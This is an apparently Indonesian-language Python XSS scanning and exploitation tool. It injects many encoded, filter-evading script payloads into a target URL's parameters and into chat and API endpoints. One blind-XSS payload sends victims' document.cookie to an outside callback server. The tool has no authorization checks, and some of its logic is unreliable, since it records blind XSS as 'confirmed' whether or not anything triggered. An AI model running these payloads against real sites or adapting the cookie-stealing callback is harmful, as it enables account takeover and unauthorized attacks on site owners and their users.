#!/usr/bin/env python3

import requests
import re
import json
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from rich.console import Console
import random
import string
import base64
import time
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.common.exceptions import TimeoutException
import os

console = Console()

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 Chrome/117 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) CriOS/117 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/110 Firefox/110"
]

HEADERS = {
    "User-Agent": random.choice(USER_AGENTS),
    "Accept-Encoding": "gzip, deflate",
    "Connection": "keep-alive"
}

def generate_test_string():
    return 'XSS_TEST_' + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))

def encode_payload(payload):
    encodings = [
        payload,
        payload.replace("<", "%3C").replace(">", "%3E"),
        payload.replace("<", "&#60;").replace(">", "&#62;"),
        payload.replace("<", "&#x3c;").replace(">", "&#x3e;"),
        payload.replace("script", "<scr<script>ipt>"),
        payload.replace("alert", "al\\u0065rt"),
        payload.replace("onerror", "on\\u0065rror"),
        base64.b64encode(payload.encode()).decode(),
        payload.replace("(", "%28").replace(")", "%29")
    ]

    polyglots = [
        'javascript:/*--></title></style><isindex formaction=jAvaScript:alert(1) type=submit>',
        '"><svg/onload=confirm(1)>',
        '<img src=x onerror="&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">',
        'eval(String.fromCharCode(97,108,101,114,116,40,49,41))'
    ]
    encodings.extend(polyglots)
    return list(set(encodings))

def fetch_all_payloads():
    payloads = set()

    professional_payloads = [
        '<svg/onload=alert(1)>',
        '<img src=x onerror=alert(1)>',
        '" onfocus="alert(1)" autofocus=',
        '"><script>alert(1)</script>',
        "'`\"><script>alert(1)</script>",
        '<marquee onstart=alert(1)>',
        '<math href="javascript:alert(1)">clickme</math>',
        '<iframe src=javascript:alert(1)>',
        '<input type="text" value="x" onfocus="alert(1)" autofocus>',
        '<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">',
        '<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">',
        '<link rel="stylesheet" href="javascript:alert(1)">',
        '<meta http-equiv="refresh" content="0;javascript:alert(1)">',
        '<textarea autofocus onautoscroll=alert(1)>test</textarea>',
        '<x onmouseover="alert(1)" style="position:absolute;left:0;top:0;width:5000px;height:5000px">',
        'javascript:alert(1)',
        'eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41))',
        '%253Cscript%253Ealert(1)%253C%2Fscript%253E',
        '\u003Cscript\u003Ealert(1)\u003C/script\u003E',
        '<style>@import\'javascript:alert(1)\';</style>',
        '<a href="javas&#x09;cript:alert(1)">Click me</a>',
        '<img src=x onerror=eval("al"+"ert(1)")>',
        '<script>self["al"+"ert"](1)</script>'
    ]

    for p in professional_payloads:
        payloads.update(encode_payload(p))

    return list(set(payloads))

def detect_reflection_context(html, test_value):
    html = html.lower()
    test_value = test_value.lower()
    
    if f'value="{test_value}"' in html or f'value={test_value}' in html:
        return 'html_attribute'
    elif f'>{test_value}<' in html:
        return 'html_body'
    elif re.search(rf'on\w+=[\"\'][^\"\']*{test_value}', html):
        return 'js_event'
    elif re.search(rf'=[\"\']?[^\"\']*{test_value}', html):
        return 'attribute_value'
    else:
        return 'unknown'

def inject_payload(url, param, payload):
    parsed = urlparse(url)
    query = parse_qs(parsed.query)
    query[param] = payload
    new_query = urlencode(query, doseq=True)
    return urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))

def verify_xss_trigger(url, param, payload):
    test_url = inject_payload(url, param, payload)
    try:
        res = requests.get(test_url, headers={"User-Agent": random.choice(USER_AGENTS)}, timeout=10)
        return payload in res.text
    except:
        return False

def setup_headless_browser():
    chrome_options = Options()
    chrome_options.add_argument("--headless=new")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument(f"user-agent={random.choice(USER_AGENTS)}")
    driver = webdriver.Chrome(options=chrome_options)
    return driver

def check_dom_xss(url, param, payload):
    driver = setup_headless_browser()
    test_url = inject_payload(url, param, payload)
    try:
        driver.get(test_url)
        time.sleep(3)
        page_source = driver.page_source
        return payload in page_source
    except TimeoutException:
        return False
    finally:
        driver.quit()

def check_stored_xss(url, param, payload, verify_url=None):
    
    test_url = inject_payload(url, param, payload)
    try:
        res = requests.get(test_url, headers={"User-Agent": random.choice(USER_AGENTS)}, timeout=10)
        if not verify_url:
            verify_url = url
        res_verify = requests.get(verify_url, headers={"User-Agent": random.choice(USER_AGENTS)}, timeout=10)
        return payload in res_verify.text
    except:
        return False

def check_blind_xss(url, param, callback_url):
    payload = f'<img src=x onerror=document.location="{callback_url}?log="+document.cookie>'
    test_url = inject_payload(url, param, payload)
    try:
        requests.get(test_url, headers={"User-Agent": random.choice(USER_AGENTS)}, timeout=10)
        return True
    except:
        return False

def check_live_chat_xss(chat_api, payload):
    try:
        res = requests.post(chat_api, data={"message": payload}, headers={"User-Agent": random.choice(USER_AGENTS)})
        return payload in res.text
    except:
        return False

def check_ajax_api_xss(api_endpoint, param, payload):
    try:
        res = requests.post(api_endpoint, json={param: payload}, headers={"User-Agent": random.choice(USER_AGENTS)})
        return payload in res.text
    except:
        return False

def fuzz_xss(url, param_list, payloads, verify_url=None, chat_api=None, api_endpoint=None, blind_callback=None):
    result = {
        "target": url,
        "tested_params": [],
        "xss_found": []
    }

    test_value = generate_test_string()
    for param in param_list:
        test_url = inject_payload(url, param, test_value)
        try:
            res = requests.get(test_url, headers={"User-Agent": random.choice(USER_AGENTS)}, timeout=10)
            context = detect_reflection_context(res.text.lower(), test_value)
            if context == 'unknown':
                continue

            console.print(f"[cyan]→ Scanning parameter: {param}[/cyan]")
            for payload in payloads:
                final_url = inject_payload(url, param, payload)

                res = requests.get(final_url, headers={"User-Agent": random.choice(USER_AGENTS)}, timeout=10)
                if payload in res.text and verify_xss_trigger(url, param, payload):
                    match = re.search(re.escape(payload), res.text, re.IGNORECASE | re.DOTALL)
                    snippet = res.text[match.start()-50:match.end()+50] if match else "..."

                    result["xss_found"].append({
                        "type": "reflected",
                        "url": final_url,
                        "param": param,
                        "payload": payload,
                        "reflection_context": context,
                        "snippet": snippet,
                        "confirmed": True
                    })
                    console.print(f"[bold green][+] Reflected XSS ditemukan di {param}[/bold green]")

                dom_detected = check_dom_xss(url, param, payload)
                if dom_detected:
                    result["xss_found"].append({
                        "type": "dom_based",
                        "url": final_url,
                        "param": param,
                        "payload": payload,
                        "reflection_context": "dom_based",
                        "snippet": "DOM manipulation detected",
                        "confirmed": True
                    })
                    console.print(f"[bold yellow][+] DOM-Based XSS ditemukan di {param}[/bold yellow]")

                stored = check_stored_xss(url, param, payload, verify_url)
                if stored:
                    result["xss_found"].append({
                        "type": "stored",
                        "url": final_url,
                        "param": param,
                        "payload": payload,
                        "reflection_context": "stored",
                        "snippet": "Stored in backend",
                        "confirmed": True
                    })
                    console.print(f"[bold magenta][+] Stored XSS ditemukan di {param}[/bold magenta]")

                if blind_callback:
                    check_blind_xss(url, param, blind_callback)
                    result["xss_found"].append({
                        "type": "blind",
                        "url": final_url,
                        "param": param,
                        "payload": payload,
                        "reflection_context": "blind",
                        "callback": blind_callback,
                        "confirmed": True
                    })
                    console.print(f"[bold red][+] Blind XSS ditemukan di {param}[/bold red]")

                if chat_api and check_live_chat_xss(chat_api, payload):
                    result["xss_found"].append({
                        "type": "live_chat",
                        "url": chat_api,
                        "param": param,
                        "payload": payload,
                        "reflection_context": "chat_message",
                        "snippet": "Injected into chat UI",
                        "confirmed": True
                    })
                    console.print(f"[bold blue][+] Live Chat XSS ditemukan di {param}[/bold blue]")

                if api_endpoint and check_ajax_api_xss(api_endpoint, param, payload):
                    result["xss_found"].append({
                        "type": "ajax",
                        "url": api_endpoint,
                        "param": param,
                        "payload": payload,
                        "reflection_context": "api_response",
                        "snippet": "Payload reflected in API response",
                        "confirmed": True
                    })
                    console.print(f"[bold cyan][+] AJAX/API XSS ditemukan di {param}[/bold cyan]")

        except Exception as e:
            continue
        result["tested_params"].append(param)

    return result

def save_json(data, domain):
    os.makedirs("logs", exist_ok=True)
    timestamp = datetime.now().strftime("%Y%m%d%H%M")
    filename = f"logs/xss_fuzz_{domain}_{timestamp}.json"
    with open(filename, "w") as f:
        json.dump(data, f, indent=4, ensure_ascii=False)
    console.print(f"[green]✔ Hasil XSS disimpan ke {filename}[/green]")

def run():
    try:
        target = input("Masukkan URL target: ").strip()
        parsed = urlparse(target)
        domain = parsed.netloc

        if not parsed.query:
            console.print("[red]URL harus memiliki parameter![/red]")
            return

        param_list = list(parse_qs(parsed.query).keys())
        if not param_list:
            console.print("[red]Tidak dapat mendeteksi parameter![/red]")
            return

        payloads = fetch_all_payloads()
        
        verify_url = input("Jika ada halaman lain untuk verifikasi Stored XSS, masukkan: ").strip() or None
        chat_api = input("Jika ada API chat, masukkan: ").strip() or None
        api_endpoint = input("Jika ada API endpoint, masukkan: ").strip() or None
        blind_callback = input("Masukkan Blind XSS callback (misal: https://yourserver.com/log):  ").strip() or None

        results = fuzz_xss(target, param_list, payloads, verify_url, chat_api, api_endpoint, blind_callback)
        save_json(results, domain)
        console.print("[bold green]✓ Pemindaian XSS selesai dengan akurasi tinggi[/bold green]")

    except KeyboardInterrupt:
        console.print("\n[red]❌ Dibatalkan oleh pengguna (Ctrl+C)[/red]")

if __name__ == "__main__":
    from datetime import datetime
    run()
